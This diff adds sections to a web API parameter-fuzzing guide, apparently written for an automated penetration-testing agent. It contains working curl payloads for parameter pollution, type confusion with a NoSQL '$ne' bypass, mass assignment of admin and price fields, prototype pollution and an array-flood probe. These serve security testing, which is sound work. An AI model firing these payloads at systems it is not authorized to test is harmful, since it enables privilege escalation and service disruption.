@@ -126,3 +126,96 @@ run_tool arjun -u "https://TARGET/endpoint" -w custom_params.txt
 run_tool curl -sv "https://TARGET/endpoint?discovered_param=test" 2>&1
 diff <(run_tool curl -s "https://TARGET/endpoint") <(run_tool curl -s "https://TARGET/endpoint?param=value")
 ```
+
+### 10. Parameter Pollution (HPP)
+
+Different frameworks resolve duplicate keys differently (first/last/array-join/concat) — this
+can bypass a single validator, smuggle a second value past WAF inspection of the first, or
+override a value set earlier in the request pipeline:
+
+```bash
+run_tool curl -s "https://TARGET/endpoint?id=1&id=2"                       # which wins?
+run_tool curl -s "https://TARGET/endpoint?id[]=1&id[]=2"                   # PHP array-style
+run_tool curl -s "https://TARGET/endpoint?id=1;id=2"                       # semicolon-delimited (older frameworks)
+run_tool curl -s -X POST "https://TARGET/endpoint" -d "role=user&role=admin"
+run_tool curl -s -X POST "https://TARGET/endpoint" -H "Content-Type: application/json" \
+  -d '{"role":"user","role":"admin"}'                                      # duplicate JSON key — last-write-wins in most parsers
+```
+Compare response/behavior against single-value baseline; a differential confirms the backend and any WAF/validation layer disagree on which value is authoritative.
+
+### 11. Type Confusion / Coercion Fuzzing
+
+APIs that don't strictly type-check JSON bodies often mis-handle non-scalar substitutions:
+
+```bash
+for payload in '{"id":123}' '{"id":"123"}' '{"id":true}' '{"id":null}' '{"id":[]}' '{"id":{}}' '{"id":["1","2"]}'; do
+  run_tool curl -s -X POST "https://TARGET/endpoint" -H "Content-Type: application/json" -d "$payload" -w " [%{http_code}]\n"
+done
+# An array/object where a scalar is expected can trigger a NoSQL operator-injection style bypass
+# (e.g. {"password":{"$ne":null}}) — hand a confirmed case to nosql-injection.
+```
+
+### 12. Mass-Assignment-Style Extra-Field Probing
+
+Distinct from hidden-param discovery: here the parameter name is *known* from the schema but
+normally server-controlled (role, isAdmin, price, balance, status, verified, ownerId):
+
+```bash
+run_tool curl -s -X POST "https://TARGET/endpoint" -H "Content-Type: application/json" \
+  -d '{"name":"test","role":"admin","isAdmin":true,"verified":true,"price":0,"status":"approved"}'
+```
+Any accepted overwrite of a server-controlled field is a `mass-assignment` finding, not just a fuzzing note.
+
+### 13. Array/Depth Limit and Prototype-Pollution Probes
+
+```bash
+run_tool curl -s "https://TARGET/endpoint?id[0]=1&id[1]=2&id[2]=3"          # array depth
+python3 -c "print('id[]=1&' * 5000)" | run_tool curl -s -X POST "https://TARGET/endpoint" -d @- -H "Content-Type: application/x-www-form-urlencoded"  # excessive array keys — DoS/complexity-attack signal, escalate to resource-exhaustion-testing
+run_tool curl -s -X POST "https://TARGET/endpoint" -H "Content-Type: application/json" \
+  -d '{"__proto__":{"polluted":"yes"}}'
+run_tool curl -s -X POST "https://TARGET/endpoint" -H "Content-Type: application/json" \
+  -d '{"constructor":{"prototype":{"polluted":"yes"}}}'
+# Any observable effect from __proto__/constructor.prototype keys -> hand off to prototype-pollution
+```
+
+### 14. Wordlist Escalation Tiers
+
+Don't jump straight to the largest corpus — escalate only when the smaller tier returns
+nothing, to keep request volume proportional to signal:
+
+```bash
+# L1: bounded PARAM_WORDLIST built above (~20 names) — always run first
+# L2: seclists param-mining lists if a workspace-local copy exists in $DIR/scans/
+#     (burp-parameter-names.txt, common-api-parameters.txt) — copy once, don't glob host paths live
+# L3: Arjun's own bundled wordlist via -w flag, or a JSON-derived custom list (see 15/16 below)
+run_tool arjun -u "https://TARGET/endpoint" -w "$DIR/scans/param-wordlist-l2.txt" -m GET
+```
+
+### 15. JS-Mined Parameter Names
+
+Endpoint-specific parameter names rarely appear in generic wordlists but often leak directly
+from client bundles already pulled by `source-analysis` — reuse that output instead of
+guessing blind:
+
+```bash
+# Pull query-string keys, fetch/axios body keys, and destructured request-object fields
+grep -noE '[?&]([a-zA-Z_][a-zA-Z0-9_]{1,30})=' "$DIR/downloads/"*.js | sed -E 's/.*[?&]([a-zA-Z0-9_]+)=/\1/' | sort -u > "$DIR/scans/param-js-mined.txt"
+grep -noE '(body|data|params)\s*:\s*\{[^}]*\}' "$DIR/downloads/"*.js | grep -oE '[a-zA-Z_][a-zA-Z0-9_]*(?=\s*:)' | sort -u >> "$DIR/scans/param-js-mined.txt"
+sort -u "$DIR/scans/param-js-mined.txt" -o "$DIR/scans/param-js-mined.txt"
+run_tool ffuf -u "https://TARGET/endpoint?FUZZ=test" -w "$DIR/scans/param-js-mined.txt" -fs BASELINE_SIZE
+```
+This targets the exact parameter names the app actually uses — a much higher hit rate than
+a generic dictionary, and it's zero-cost since the JS was already fetched during recon.
+
+### 16. GraphQL-Introspection-Derived Argument Names
+
+When `source-analysis` or `graphql-testing` has already pulled a schema via introspection,
+mine field/input-type argument names as a targeted wordlist for REST siblings of the same
+API (many backends expose both a GraphQL and a legacy REST surface with overlapping fields):
+
+```bash
+jq -r '.data.__schema.types[]? | select(.inputFields != null) | .inputFields[].name' "$DIR/scans/graphql_schema.json" | sort -u > "$DIR/scans/param-graphql-mined.txt"
+jq -r '.data.__schema.types[]? | .fields[]?.args[]?.name' "$DIR/scans/graphql_schema.json" | sort -u >> "$DIR/scans/param-graphql-mined.txt"
+sort -u "$DIR/scans/param-graphql-mined.txt" -o "$DIR/scans/param-graphql-mined.txt"
+run_tool ffuf -u "https://TARGET/api/endpoint?FUZZ=test" -w "$DIR/scans/param-graphql-mined.txt" -fs BASELINE_SIZE
+```
